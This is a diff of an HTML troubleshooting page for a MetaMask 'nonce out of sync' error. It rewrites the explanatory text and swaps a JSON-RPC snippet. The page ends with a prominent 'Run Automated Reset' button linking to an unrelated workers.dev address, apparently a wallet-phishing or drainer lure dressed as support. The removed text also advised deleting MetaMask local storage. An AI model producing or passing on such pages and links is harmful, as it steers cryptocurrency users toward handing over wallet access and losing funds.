@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #0a0c10;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,32 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum (ETH) network.</li>
+<li>The user encounters a "nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network. This error typically occurs when the nonce value stored in MetaMask does not match the nonce value expected by the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs when the transaction nonce stored in MetaMask does not match the nonce expected by the Ethereum network, often due to cancelled, pending, or stuck transactions.</li>
+<li>The error happens due to a discrepancy between the transaction count in MetaMask and the actual transaction count on the Ethereum blockchain. This can occur if a transaction is sent but not confirmed, or if a transaction is cancelled or replaced.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the MetaMask account to recover from the nonce mismatch:</li>
-<li>Delete the MetaMask local storage to reset account settings</li>
-<li>Remove any pending transactions to prevent nonce conflicts</li>
-<li>Update the transaction nonce manually using the following command:</li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Reset the account in MetaMask to resynchronize the nonce value.</li>
+<li>Manually set the nonce value to the correct number using the Ethereum JSON-RPC API.</li>
+<li>Use the following JSON-RPC command to get the current transaction count:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="o">{</span><span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...YOUR_ADDRESS...&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...NEW_NONCE_VALUE...&quot;</span>
-<span class="o">}</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for executing the above command. </p>
-<h2>Prerequisites</h2>
-<ul>
-<li>MetaMask extension installed and configured</li>
-<li>Ethereum account with a positive balance</li>
-<li>Basic understanding of Ethereum transaction nonces and their role in transaction processing</li>
-</ul>
+<p>Consider utilizing an external console for more advanced troubleshooting and direct access to Ethereum network data.</p>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
